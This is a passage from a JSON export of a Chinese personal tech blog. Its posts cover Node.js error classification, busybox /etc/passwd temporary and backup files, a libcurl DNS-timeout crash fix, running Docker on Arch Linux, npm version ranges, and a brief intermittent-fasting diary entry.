  "body": "<p>\n\u5148\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">app.post(<span style=\"color: #66cccc;\">'\/products'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">req<\/span>, <span style=\"color: #ffcc66;\">res<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   service.add(req.body, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   logger.error(err.toString());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.statusCode = 500;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> res.end({error: err.message});\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.statusCode = 200;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.end();\n<span style=\"background-color: #515151;\"> <\/span>   });\n}};\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u7684\u4ee3\u7801\u80fd\u591f\u76f4\u63a5\u7528\u4e8e\u4ea7\u54c1\u73af\u5883\u5417\uff1f\n<\/p>\n\n<p>\n\u5bf9\u4e8e\u7a0d\u5fae\u4e25\u8c28\u7684\u4ea7\u54c1\uff0c\u7b54\u6848\u80af\u5b9a\u662f <span class=\"underline\">\u5426<\/span> \u3002\n<\/p>\n\n<p>\n\u9488\u5bf9 service.add \u8c03\u7528\u5931\u8d25\u63d0\u4e24\u4e2a\u7591\u95ee\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5982\u4f55\u6839\u636e\u9519\u8bef\u7c7b\u578b\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56de\u4e0d\u540c\u7684\u54cd\u5e94\uff0c\u4ee5\u4fbf\u5ba2\u6237\u7aef\u66f4\u4eba\u6027\u5316\uff08\u800c\u975e\u7b80\u5355\u7684\u5f39\u6d88\u606f\u6846\uff09\uff1f\n<\/li>\n\n<li>err.message \u4f1a\u4e0d\u4f1a\u5305\u542b\u4e0d\u5e94\u8be5\u7ed9\u7528\u6237\u770b\u5230\u7684\u4fe1\u606f\uff1f\n<\/li>\n<\/ul>\n\n<p>\n\u6211\u4eec\u9700\u8981\u89c4\u8303\u5316\u9519\u8bef\u7c7b\u578b\uff0c\u8fdb\u884c\u660e\u786e\u7684\u5206\u7c7b\u6807\u8bc6\uff0c\u76f4\u5230\u6700\u5916\u5c42\u7684\u4ee3\u7801\u80fd\u591f\u6839\u636e\u9519\u8bef\u5bf9\u8c61\u63d0\u4f9b\u7684\u4fe1\u606f\uff0c\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56de\u6070\u5f53\u7684\u54cd\u5e94\uff0c\n\u4e0b\u9762\u662f\u6211\u80fd\u60f3\u5230\u7684\u4e00\u4e9b\u57fa\u672c\u539f\u5219\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u9519\u8bef\u5bf9\u8c61\u62e5\u6709\u7edf\u4e00\u7684\u63a5\u53e3\n\n<p>\n\u786e\u4fdd\u9519\u8bef\u5bf9\u8c61\u662f\u4e00\u4e2aError\u7c7b\u5b9e\u4f8b\uff0c\u5982\u9700\u8981\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\uff0c\u4eceError\u7c7b\u7ee7\u627f\u3002\n<\/p>\n<\/li>\n\n<li>\u5bf9\u9519\u8bef\u8fdb\u884c\u547d\u540d\u6807\u8bc6\n\n<p>\n\u91cd\u91cf\u7ea7\u7684\u505a\u6cd5\uff1a\u4e3a\u6bcf\u4e00\u4e2a\u9519\u8bef\u7c7b\u578b\u81ea\u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u7c7b\u3002\n\u8f7b\u91cf\u7ea7\u7684\u505a\u6cd5\uff1a\u5c06Error\u5bf9\u8c61\u7684name\u5c5e\u6027\u8bbe\u7f6e\u4e3a\u9519\u8bef\u7c7b\u578b\u6807\u8bc6\u3002\n<\/p>\n<\/li>\n\n<li>\u5728\u6070\u5f53\u7684\u5c42\u6b21\u5c06\u5e95\u5c42Error\u5bf9\u8c61\u8f6c\u5316\u4e3a\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u5bf9\u8c61\n\n<p>\n\u5bf9\u5e95\u5c42\u8fd4\u56de\u7684\u539f\u59cb\u9519\u8bef\uff0c\u5c3d\u53ef\u80fd\u5728\u8c03\u7528\u6808\u6070\u5f53\u7684\u5c42\u6b21\u8f6c\u5316\u4e3a\u5408\u9002\u5e94\u7528\u5c42\u9519\u8bef\u5bf9\u8c61\uff0c\u4f46\u4e0d\u5fc5\u5f3a\u5236\u5bf9\u6240\u6709\u5e95\u5c42\u9519\u8bef\u8fdb\u884c\u8f6c\u6362\uff0c\n\u539f\u751f\u7684Error\u5bf9\u8c61\u53ef\u4ee5\u8ba4\u4e3a\u662f\u672a\u6807\u8bc6\u7684\u9519\u8bef\uff0c\u8fd9\u79cd\u9519\u8bef\u53ef\u4ee5\u9ed8\u8ba4\u5904\u7406\uff08\u5982\uff1a\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56deHTTP 500\u9519\u8bef\uff09\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u9519\u8bef\u8fdb\u884c\u5206\u7c7b\u6807\u8bc6\u540e\u7684\u4f7f\u7528\u793a\u4f8b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">app.post(<span style=\"color: #66cccc;\">'\/products'<\/span>, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">req<\/span>, <span style=\"color: #ffcc66;\">res<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   service.add(req.body, <span style=\"color: #99cc99;\">function<\/span> (<span style=\"color: #ffcc66;\">err<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   logger.error(err.toString());\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (err.name === <span style=\"color: #66cccc;\">'ProductAlreadyExists'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.statusCode = 400;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   err.message = <span style=\"color: #66cccc;\">'&#20869;&#37096;&#38169;&#35823;'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.statusCode = 500;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> res.end({error: err.message});\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.statusCode = 200;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   res.end();\n<span style=\"background-color: #515151;\"> <\/span>   });\n}};\n<\/pre>\n<\/div>\n\n<p>\n\u4f18\u96c5\u7684\u9519\u8bef\u5904\u7406\u662f\u7cfb\u7edf\u53ef\u7ef4\u62a4\u6027\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u5b83\u548c\u4ee3\u7801\u5404\u90e8\u5206\u606f\u606f\u76f8\u5173\uff0c\u7cfb\u7edf\u6210\u578b\u540e\u5f88\u96be\u518d\u5f15\u5165\u9519\u8bef\u5904\u7406\uff0c\u8bbe\u8ba1\u7cfb\u7edf\u65f6\u5e94\u8be5\u4e00\u5f00\u59cb\u5c31\u5c06\u5b83\u7eb3\u5165\u8003\u8651\u8303\u56f4\u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u300a<a href=\"https:\/\/www.joyent.com\/developers\/node\/design\/errors\">Error Handling in Nodejs - Developer Center - Joyent<\/a>\u300b\n\n<p>\n\u6765\u81eaJoyent\u7684Node.js\u9519\u8bef\u5904\u7406\u6700\u4f73\u5b9e\u8df5\n<\/p>\n<\/li>\n\n<li>\u300a<a href=\"https:\/\/cnodejs.org\/topic\/52090bc944e76d216af25f6f\">Node.js\u4e0b\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b - CNode<\/a>\u300b\n\n<p>\n\u6d3e\u751fError\u7c7b\u6ce8\u610f\u4e8b\u9879\n<\/p>\n<\/li>\n\n<li>\u300a<a href=\"https:\/\/docs.nodejitsu.com\/articles\/errors\/what-is-the-error-object\">What is the error object? - docs.nodejitsu.com<\/a>\u300b\n\n<p>\nError\u5bf9\u8c61\u8be6\u89e3\n<\/p>\n<\/li>\n\n<li>\u300a<a href=\"http:\/\/www.bennadel.com\/blog\/2828-creating-custom-error-objects-in-node-js-with-error-capturestacktrace.htm\">Creating Custom Error Objects In Node.js With Error.captureStackTrace()<\/a>\u300b\n\n<p>\n\u76f4\u63a5\u53ef\u7528\u7684\u81ea\u5b9a\u4e49Error\u7c7b\u65b9\u6848\n<\/p>\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/jayyvis\/extend-error\">extend-error<\/a>\n\n<p>\n\u7528\u4e8e\u6269\u5c55Error\u7c7b\u7684node.js\u6a21\u5757\n<\/p>\n<\/li>\n\n<li><a href=\"https:\/\/github.com\/davepacheco\/node-verror\">node-verror<\/a>\n\n<p>\n\u5305\u88f9\u539f\u59cbError\u5bf9\u8c61\uff0c\u5e76\u4e14\u4fdd\u8bc1\u53ef\u8bbf\u95ee\u6027\u7684node.js\u6a21\u5757\uff0cJoyent\u7684Node.js\u9519\u8bef\u5904\u7406\u6700\u4f73\u5b9e\u8df5\u4e2d\u8fdb\u884c\u4e86\u63a8\u8350\n<\/p>\n<\/li>\n\n<li>\u300a<a href=\"https:\/\/github.com\/davepacheco\/node-verror\/issues\/15\">Support for custom error types? \u00b7 Issue #15 \u00b7 davepacheco\/node-verror<\/a>\u300b\n\n<p>\n<a href=\"https:\/\/github.com\/davepacheco\/node-verror\">node-verror<\/a> \u652f\u6301\u6269\u5c55\u7684\u8ba8\u8bba<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u8089\u8089\u53c8\u957f\u56de\u6765\u4e86",
  "timestamp": "2015-11-03 17:27:00",
  "tags": [
    "\u8f7b\u65ad\u98df"
  ],
  "body": "<p>\n\u65e9\u4e0a\u79f0\u4e86\u4e00\u4e0b\u4f53\u91cd\uff0c\u5230\u4e8667.8\u516c\u65a4\uff0c\u505c\u6b62\u65ad\u98df1\u4e2a\u591a\u6708\u7684\u6210\u679c\u5c31\u662f\u957f\u4e865-6\u65a4\u8089\u8089\u3002\n<\/p>\n\n<p>\n\u8f7b\u65ad\u98df\u662f\u4e00\u79cd\u751f\u6d3b\u65b9\u5f0f\uff0c\u679c\u7136\u6ca1\u6709\u8bf4\u9519\u3002\n<\/p>\n\n<p>\n\u4eca\u5929\u5f00\u59cb\u7ee7\u7eed\u4e00\u5468\u4e24\u65ad\u7684\u751f\u6d3b\uff0c\u51cf\u4e0b\u6765\u4ee5\u540e\u4e5f\u8981\u7ef4\u6301\u4e00\u5468\u4e00\u65ad\u624d\u884c\u3002<\/p>\n"
},
{
  "title": "\/etc\/passwd\u3001\/etc\/passwd+\u3001\/etc\/passwd- \u6587\u4ef6\u4ecb\u7ecd",
  "timestamp": "2015-11-24 15:58:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nbusybox\u4e0b\u4fee\u6539\u5bc6\u7801\u6216\u521b\u5efa\u7528\u6237\u7684\u65f6\u5019\uff0c\u6709\u65f6\u5019\u64cd\u4f5c\u4f1a\u5931\u8d25\uff0c\u6b64\u65f6 <code>\/etc<\/code> \u76ee\u5f55\u53ef\u80fd\u51fa\u73b0 <code>passwd+<\/code> \u3001 <code>passwd-<\/code> \u4e24\u4e2a\u6587\u4ef6\u3002\n<\/p>\n\n<p>\n\u5f53\u51fa\u73b0 <code>\/etc\/passwd+<\/code> \u6587\u4ef6\u65f6\uff0c\u4fee\u6539\u5bc6\u7801\u4f1a\u8017\u65f6\u51e0\u79d2\u949f\u7136\u540e\u62a5\u9519\uff1a\n<\/p>\n\n<pre class=\"example\">\n# passwd root\nChanging password for root\nNew password: 123456\n\nRetype password: 123456\n\npasswd: can't create '\/etc\/passwd+': File exists\npasswd: can't update password file \/etc\/passwd\n#\n<\/pre>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u6839\u636e <a href=\"https:\/\/svn.mcs.anl.gov\/repos\/ZeptoOS\/trunk\/BGP\/packages\/busybox\/src\/libbb\/update_passwd.c\">update_passwd.c<\/a> \u53ef\u4ee5\u83b7\u5f97\u4ee5\u4e0b\u4fe1\u606f<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>\/etc\/passwd<\/code> \u7528\u6237\u5e10\u53f7\u914d\u7f6e\u6587\u4ef6\n<\/li>\n\n<li><code>\/etc\/passwd+<\/code> \u66f4\u65b0\u8fc7\u7a0b\u4e2d\u7684\u4e34\u65f6\u6587\u4ef6\n<\/li>\n\n<li><code>\/etc\/passwd-<\/code> \u7528\u6237\u5e10\u53f7\u914d\u7f6e\u6587\u4ef6\u7684\u5907\u4efd\n<\/li>\n<\/ul>\n\n<p>\n\u66f4\u65b0\u5bc6\u7801\u903b\u8f91\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u521b\u5efa <code>\/etc\/passwd+<\/code> \u6587\u4ef6\n\n<p>\n\u5982\u679c <code>\/etc\/passwd+<\/code> \u6587\u4ef6\u5b58\u5728\uff0c\u5219\u4f1a\u8fd4\u56de\u9519\u8bef.\n<\/p>\n<\/li>\n\n<li>\u5907\u4efd <code>\/etc\/passwd<\/code> \u6587\u4ef6\u5230 <code>\/etc\/passwd-<\/code>\n<\/li>\n\n<li>\u66f4\u65b0\u540e\u7684\u5e10\u53f7\u914d\u7f6e\u5199\u5230 <code>\/etc\/passwd+<\/code> \u6587\u4ef6\n<\/li>\n\n<li>\u5c06 <code>\/etc\/passwd+<\/code> \u6587\u4ef6\u91cd\u547d\u540d\u4e3a <code>\/etc\/passwd<\/code>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u7ecf\u9a8c\u6cd5\u5219<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li><code>\/etc\/passwd<\/code> \u6587\u4ef6\u635f\u574f\u65f6\uff0c\u4f7f\u7528\u5907\u4efd\u6587\u4ef6 <code>\/etc\/passwd-<\/code> \u8fd8\u539f\n<\/li>\n\n<li><code>\/etc\/passwd+<\/code> \u6587\u4ef6\u5b58\u5728\u5bfc\u81f4\u65e0\u6cd5\u66f4\u65b0\u5e10\u53f7\u4fe1\u606f\uff0c\u76f4\u63a5\u5220\u9664 <code>\/etc\/passwd+<\/code> \u6587\u4ef6\u5373\u53ef\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u4fee\u590dlibcurl\u57df\u540d\u89e3\u6790\u8d85\u65f6\u5f15\u8d77\u7684\u5185\u5b58\u8d8a\u754c\u95ee\u9898",
  "timestamp": "2015-12-09 14:17:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n\u7a0b\u5e8f\u53d1\u5e03\u540e\u5728\u4e00\u4e2a\u7528\u6237\u7684\u673a\u5668\u4e0a\u9891\u7e41\u51fa\u73b0\u5d29\u6e83\uff0c\u6700\u7ec8\u5b9a\u4f4d\u5230\u5d29\u6e83\u6765\u81ea\u4e00\u4e2a\u65ad\u8a00\u5931\u8d25\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">assert(pthread_self() != main_thread_id);\n<\/pre>\n<\/div>\n\n<p>\n\u4e0a\u9762\u8fd9\u6761\u8bed\u53e5\u51fa\u73b0\u5728\u5de5\u4f5c\u7ebf\u7a0b\u56de\u8c03\u7684\u51fd\u6570\u4e2d\uff0c\u7adf\u7136\u53d1\u751f\u4e86\u5de5\u4f5c\u7ebf\u7a0bID\u548c\u4e3b\u7ebf\u7a0bID\u76f8\u540c\u7684\u602a\u4e8b\uff0c\n\u89c2\u5bdf\u4e86\u8fd0\u884c\u65e5\u5fd7\uff0c\u53d1\u73b0\u4f7f\u7528libcurl\u53d1\u8d77HTTP\u8bf7\u6c42\u5982\u679c\u8d85\u65f6\u5219\u6709\u5f88\u5927\u673a\u7387\u4f1a\u65ad\u8a00\u5931\u8d25\u5bfc\u81f4\u5d29\u6e83\uff0c\n\u5728\u4f7f\u7528libcurl\u53d1\u8d77HTTP\u8bf7\u6c42\u7684\u4ee3\u7801\u5757\u524d\u540e\u8f93\u51fa\u5de5\u4f5c\u7ebf\u7a0bID\uff0c\u5de5\u4f5c\u7ebf\u7a0bID\u51fa\u73b0\u4e86\u53d8\u5316\uff0c\n\u6839\u636e\u7ecf\u9a8c\u5f88\u53ef\u80fd\u662f\u51fa\u73b0\u4e86\u5185\u5b58\u8d8a\u754c\u3002\n<\/p>\n\n<p>\n\u6700\u7ec8\u627e\u5230\u4e86\u51e0\u7bc7 <code>libcurl<\/code> \u591a\u7ebf\u7a0b\u5b89\u5168\u76f8\u5173\u7684\u6587\u7ae0\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u300a<a href=\"http:\/\/blog.csdn.net\/balderfan\/article\/details\/7599554\">libcurl \u591a\u7ebf\u7a0b\u4f7f\u7528\u6ce8\u610f\u4e8b\u9879<\/a>\u300b\n<\/li>\n\n<li>\u300a<a href=\"http:\/\/blog.csdn.net\/delphiwcdj\/article\/details\/18284429\">Libcurl\u591a\u7ebf\u7a0bcrash\u95ee\u9898<\/a>\u300b\n<\/li>\n<\/ul>\n\n<p>\n\u4fee\u590d\u6b65\u9aa4\u603b\u7ed3\u5982\u4e0b\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5728\u4e3b\u7ebf\u7a0b\u8d77\u59cb\u5904\u521d\u59cb\u5316 <code>libcurl<\/code> \u5e93\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">curl_global_init(CURL_GLOBAL_ALL);\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7981\u6b62 <code>libcurl<\/code> \u901a\u8fc7 <code>alarm<\/code> \u5b9e\u73b0\u57df\u540d\u89e3\u6790\u8d85\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);\n<\/pre>\n<\/div>\n\n<p>\n\u5982\u679c\u4e0d\u505a\u4e0b\u9762\u7684\u6700\u540e\u4e00\u6b65\uff0c <code>libcurl<\/code> \u4e0a\u8bbe\u7f6e\u7684\u8d85\u65f6\u90fd\u4f1a\u65e0\u6548\u3002\n<\/p>\n<\/li>\n\n<li>\u7f16\u8bd1 <code>libcurl<\/code> \u65f6\u542f\u7528 <code>c-ares<\/code> \u6216 <code>threaded resolver<\/code> \uff0c\u4ee5\u652f\u6301\u57df\u540d\u89e3\u6790\u8d85\u65f6\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/configure --enable-ares\n<\/pre>\n<\/div>\n\n<p>\n\u6216\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/configure --enable-threaded-resolver\n<\/pre>\n<\/div>\n\n<p>\n\u300a<a href=\"http:\/\/daniel.haxx.se\/blog\/2011\/04\/25\/libcurls-name-resolving\/\">Asynch resolving in libcurl<\/a>\u300b\u5bf9 <code>c-ares<\/code> \u6216 <code>threaded resolver<\/code> \u4e24\u79cd\u65b9\u5f0f\u8fdb\u884c\u4e86\u6bd4\u8f83\uff0c\u7b80\u800c\u8a00\u4e4b\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li><code>c-ares<\/code> \u662f\u4e00\u4e2a\u5f02\u6b65\u7684\u57df\u540d\u89e3\u6790\u5e93\uff0c\u5f00\u9500\u66f4\u5c11\uff0c\u4f46\u662f\u5b83\u5e76\u975e\u4f7f\u7528\u7cfb\u7edf\u539f\u751f\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u5bf9\u4e8e\u5b9a\u5236\u7cfb\u7edf\uff08\u5982\uff1ahosts\u6216resolv.conf\u4e0d\u5728\u6807\u51c6\u4f4d\u7f6e\uff09\u53ef\u80fd\u4f1a\u6709\u95ee\u9898\u3002\n<\/li>\n\n<li><code>threaded resolver<\/code> \u6bcf\u6b21\u57df\u540d\u89e3\u6790\u90fd\u4f1a\u5f00\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u89e3\u6790\u5b8c\u6210\u540e\u9500\u6bc1\u7ebf\u7a0b\uff0c\u5f00\u9500\u4f1a\u5927\u4e00\u4e9b\uff0c\u4f46\u662f\u7a33\u5b9a\u6027\u3001\u517c\u5bb9\u6027\u66f4\u597d\u3002\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n\n<p>\n\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u542f\u7528 <code>c-ares<\/code> \u8fdb\u884c\u4fee\u6539\u540e\u7a0b\u5e8f\u8fd0\u884c\u4e86\u4e00\u6574\u5929\uff0c\u6ca1\u6709\u518d\u5d29\u6e83\u3002<\/p>\n"
},
{
  "title": "Archlinux\u4e0b\u5b89\u88c5\u8fd0\u884cdocker",
  "timestamp": "2015-12-09 23:07:00",
  "tags": [
    "archlinux",
    "docker"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u5b89\u88c5 <code>docker<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S docker\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u914d\u7f6e <code>docker<\/code>\n\n<p>\n\u7531\u4e8e <code>docker<\/code> \u7684\u5b98\u65b9\u4ed3\u5e93\u88ab\u5899\uff0c\u9700\u8981\u4ece <code>dockerpool.com<\/code> \u4e0a\u4e0b\u8f7d\uff0c\u4fee\u6539 <code>docker<\/code> \u914d\u7f6e\u4ee5\u514d <code>pull<\/code> \u65f6\u51fa\u73b0 tls \u76f8\u5173\u9519\u8bef\u3002\n<\/p>\n\n<p>\n\u4fee\u6539 <code>\/usr\/lib\/systemd\/system\/docker.service<\/code> \u6587\u4ef6\uff0c\u5c06\n<\/p>\n\n<pre class=\"example\">\nExecStart=\/usr\/bin\/docker daemon -H fd:\/\/ --exec-opt native.cgroupdriver=cgroupfs\n<\/pre>\n\n<p>\n\u6539\u4e3a\n<\/p>\n\n<pre class=\"example\">\nExecStart=\/usr\/bin\/docker daemon --insecure-registry dl.dockerpool.com:5000 -H fd:\/\/ --exec-opt native.cgroupdriver=cgroupfs\n<\/pre>\n\n<p>\n\u751f\u6548\u914d\u7f6e\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl daemon-reload\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u542f\u52a8 <code>docker<\/code> \u670d\u52a1\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart docker\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4e0b\u8f7d <code>ubuntu14.04<\/code> \u955c\u50cf\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker pull <span style=\"color: #66cccc;\">'dl.dockerpool.com:5000\/ubuntu:14.04'<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u8bd5\u8fd0\u884c\u5bb9\u5668\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -t -i <span style=\"color: #66cccc;\">'dl.dockerpool.com:5000\/ubuntu:14.04'<\/span> \/bin\/bash\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n"
},
{
  "title": "package.json\u6587\u4ef6dependencies\u4e2d\u7684\u5404\u79cd\u7248\u672c\u53f7\u5f62\u5f0f",
  "timestamp": "2015-12-10 17:07:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u67e5\u770b <code>package.json<\/code> \u6587\u4ef6\u65f6\uff0c\u5f80\u5f80\u4f1a\u5728 <code>dependencies<\/code> \u4e0b\u770b\u5230\u5404\u79cd\u5404\u6837\u7684\u7248\u672c\u53f7\u5f62\u5f0f\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #66cccc;\">\"dependencies\"<\/span>: {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"async\"<\/span>: <span style=\"color: #66cccc;\">\"1.2.1\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"chokidar\"<\/span>: <span style=\"color: #66cccc;\">\"^1.0.0\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"vizion\"<\/span>: <span style=\"color: #66cccc;\">\"latest\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"babel\"<\/span>: <span style=\"color: #66cccc;\">\"^5.x\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"pm2-logs\"<\/span>: <span style=\"color: #66cccc;\">\"~0.1.1\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"ikt\"<\/span>: <span style=\"color: #66cccc;\">\"git+http:\/\/ikt.pm2.io\/ikt.git#master\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"punt\"<\/span>: <span style=\"color: #66cccc;\">\"*\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"express\"<\/span>: <span style=\"color: #66cccc;\">\"&gt;=3.0.0\"<\/span>,\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #66cccc;\">\"connect\"<\/span>: <span style=\"color: #66cccc;\">\"1.30.2 - 2.30.2\"<\/span>,\n}\n<\/pre>\n<\/div>\n\n<p>\n\u4e00\u822c\u81ea\u5df2\u5199 <code>package.json<\/code> \u65f6\uff0c\u56fe\u7701\u4e8b\u7248\u672c\u53f7\u4f1a\u7528 <code>*<\/code> \uff0c\u60f3\u60f3\u4e5f\u662f\u5f88\u5371\u9669\u7684\uff0c\u6307\u4e0d\u5b9a\u54ea\u5929\u4f9d\u8d56\u7684\u5305\u4e0d\u518d\u5411\u540e\u517c\u5bb9\uff0c\u7a0b\u5e8f\u8fd0\u884c\u4f30\u8ba1\u5c31\u6709\u95ee\u9898\u4e86\u3002\n<\/p>\n\n<p>\n\u7248\u672c\u53f7\u5f62\u5f0f\u662f\u6709\u636e\u53ef\u5faa\u7684\uff0c\u5b83\u5c31\u662f\u300a<a href=\"http:\/\/semver.org\/lang\/zh-CN\/\">\u8bed\u4e49\u5316\u7248\u672c 2.0.0<\/a>\u300b\uff0c <code>npm<\/code> \u9075\u5faa\u8be5\u89c4\u8303\uff0c\u4f46\u505a\u4e86\u4ee5\u4e0b\u6269\u5c55\uff1a\n<\/p>\n\n<blockquote>\n<p>\n\u7248\u672c\u53f7\u7684\u6784\u5efa\u53f7\u90e8\u5206\u5141\u8bb8\u4f7f\u7528 <code>-<\/code> \u5b57\u7b26\uff0c\u6240\u4ee5 <code>0.2.0-1<\/code> \u5728\u300a<a href=\"http:\/\/semver.org\/lang\/zh-CN\/\">\u8bed\u4e49\u5316\u7248\u672c 2.0.0<\/a>\u300b\u4e2d\u662f\u975e\u6cd5\u7684\uff0c\u5374\u662f\u5408\u6cd5\u7684 npm \u8bed\u4e49\u7248\u672c\uff08Semantic Versioning\uff09\u3002\n<\/p>\n<\/blockquote>\n\n<p>\n<code>npm<\/code> 